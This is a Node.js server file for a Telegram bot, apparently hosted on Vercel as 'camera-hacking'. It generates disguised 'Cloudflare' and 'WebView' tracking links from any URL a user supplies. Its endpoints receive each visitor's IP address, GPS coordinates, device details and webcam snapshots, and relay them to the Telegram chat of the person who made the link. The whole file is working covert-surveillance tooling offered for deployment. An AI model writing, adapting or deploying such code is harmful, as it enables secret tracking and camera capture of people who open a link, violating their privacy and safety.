require('dotenv').config();
const fs = require("fs");
const express = require("express");
const serverless = require("serverless-http");
const cors = require("cors");
const bodyParser = require("body-parser");
const fetch = require("node-fetch");
const TelegramBot = require("node-telegram-bot-api");
const app = express();

// Middleware setup
app.use(bodyParser.json({ limit: "20mb", type: "application/json" }));
app.use(bodyParser.urlencoded({ extended: true, limit: "20mb", type: "application/x-www-form-urlencoded" }));
app.use(cors());
app.set("view engine", "ejs");

// Global config
const bot = new TelegramBot(process.env["bot"], { polling: true });
const hostURL = "https://camera-hacking-iota.vercel.app"; // Change this to your actual Vercel domain
const use1pt = false;

// Utility
const btoa = (str) => Buffer.from(str).toString('base64');
const atob = (b64) => Buffer.from(b64, 'base64').toString('ascii');

// Views routes
app.get("/w/:path/:uri", (req, res) => {
  const ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.connection?.remoteAddress || req.ip;
  const time = new Date().toISOString().slice(0, 19).replace('T', ':');

  if (req.params.path) {
    res.render("webview", {
      ip,
      time,
      url: atob(req.params.uri),
      uid: req.params.path,
      a: hostURL,
      t: use1pt
    });
  } else {
    res.redirect("https://t.me/shinita_cameraBot");
  }
});

app.get("/c/:path/:uri", (req, res) => {
  const ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.connection?.remoteAddress || req.ip;
  const time = new Date().toISOString().slice(0, 19).replace('T', ':');

  if (req.params.path) {
    res.render("cloudflare", {
      ip,
      time,
      url: atob(req.params.uri),
      uid: req.params.path,
      a: hostURL,
      t: use1pt
    });
  } else {
    res.redirect("https://t.me/shinita_cameraBot");
  }
});

// Telegram bot handlers
bot.on("message", async (msg) => {
  const chatId = msg.chat.id;

  if (msg?.reply_to_message?.text == "🌐 Enter Your URL") {
    createLink(chatId, msg.text);
  }

  if (msg.text == "/start") {
    bot.sendMessage(chatId, `HIE ${msg.chat.first_name}!\n...`, {
      reply_markup: JSON.stringify({
        inline_keyboard: [[{ text: "Create Link", callback_data: "crenew" }]]
      })
    });
  } else if (msg.text == "/create") {
    createNew(chatId);
  } else if (msg.text == "/help") {
    bot.sendMessage(chatId, `HELP TEXT HERE`);
    // Optional tutorial video
    // bot.sendVideo(chatId, 'lv_0_20250328083501.mp4', { caption: 'Tutorial' });
  }
});

bot.on("callback_query", (callbackQuery) => {
  bot.answerCallbackQuery(callbackQuery.id);
  if (callbackQuery.data == "crenew") {
    createNew(callbackQuery.message.chat.id);
  }
});

bot.on("polling_error", (error) => {
  console.error("Polling error", error.code);
});

// Bot logic
async function createLink(cid, msg) {
  const encoded = [...msg].some(char => char.charCodeAt(0) > 127);

  if ((msg.toLowerCase().includes("http")) && !encoded) {
    const url = cid.toString(36) + '/' + btoa(msg);
    const cUrl = `${hostURL}/c/${url}`;
    const wUrl = `${hostURL}/w/${url}`;

    if (use1pt) {
      const x = await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(cUrl)}`).then(res => res.json());
      const y = await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(wUrl)}`).then(res => res.json());

      const f = Object.values(x).join("\n");
      const g = Object.values(y).join("\n");

      bot.sendMessage(cid, `✅ Your Links:\n🌐 Cloudflare:\n${f}\n\n🌐 WebView:\n${g}`, {
        reply_markup: JSON.stringify({ inline_keyboard: [[{ text: "Create new Link", callback_data: "crenew" }]] })
      });
    } else {
      bot.sendMessage(cid, `✅ Your Links:\n🌐 Cloudflare: ${cUrl}\n🌐 WebView: ${wUrl}`, {
        reply_markup: JSON.stringify({ inline_keyboard: [[{ text: "Create new Link", callback_data: "crenew" }]] })
      });
    }
  } else {
    bot.sendMessage(cid, `⚠️ Please enter a valid URL.`);
    createNew(cid);
  }
}

function createNew(cid) {
  bot.sendMessage(cid, "🌐 Enter Your URL", {
    reply_markup: JSON.stringify({ force_reply: true })
  });
}

// Track IP on homepage
app.get("/", (req, res) => {
  const ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.connection?.remoteAddress || req.ip;
  res.json({ ip });
});

// Location handler
app.post("/location", (req, res) => {
  const lat = parseFloat(decodeURIComponent(req.body.lat));
  const lon = parseFloat(decodeURIComponent(req.body.lon));
  const uid = decodeURIComponent(req.body.uid);
  const acc = decodeURIComponent(req.body.acc);

  if (lat && lon && uid && acc) {
    bot.sendLocation(parseInt(uid, 36), lat, lon);
    bot.sendMessage(parseInt(uid, 36), `Latitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc} meters`);
    res.send("Done");
  }
});

// Device info
app.post("/", (req, res) => {
  const uid = decodeURIComponent(req.body.uid);
  let data = decodeURIComponent(req.body.data);
  const ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.connection?.remoteAddress || req.ip;

  if (uid && data && data.includes(ip)) {
    data = data.replaceAll("<br>", "\n");
    bot.sendMessage(parseInt(uid, 36), data, { parse_mode: "HTML" });
    res.send("Done");
  } else {
    res.send("ok");
  }
});

// CamSnap
app.post("/camsnap", (req, res) => {
  const uid = decodeURIComponent(req.body.uid);
  const img = decodeURIComponent(req.body.img);

  if (uid && img) {
    const buffer = Buffer.from(img, "base64");

    bot.sendPhoto(parseInt(uid, 36), buffer, {}, {
      filename: "camsnap.png",
      contentType: "image/png"
    });

    res.send("Done");
  }
});

// Export handler for Vercel
module.exports = app;
module.exports.handler = serverless(app);
